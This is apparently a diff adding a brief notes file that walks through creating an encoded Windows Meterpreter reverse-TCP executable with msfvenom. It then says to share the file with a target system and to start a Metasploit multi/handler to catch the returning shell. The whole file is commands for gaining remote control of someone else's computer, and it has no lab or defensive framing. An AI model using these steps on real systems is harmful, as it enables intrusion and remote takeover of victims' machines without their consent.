@@ -1,0 +1,18 @@
+Note you IP address
+
+In terminal
+
+msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai lhost=Your_IP_address lport=anyport after 1043 -o /home/kali/Desktop/exploit.exe(path/filename.extension)
+-p : Payload Name
+-f : Format of payload
+-o : Output destination of payload
+
+Share this exploit to the target system
+
+write msfconsole in a terminal
+
+use exploit/multi/handler
+set lhost youripaddress
+set lport the_same_port_used_while_making_payload
+set payload windows/meterpreter/reverse_tcp
+exploit
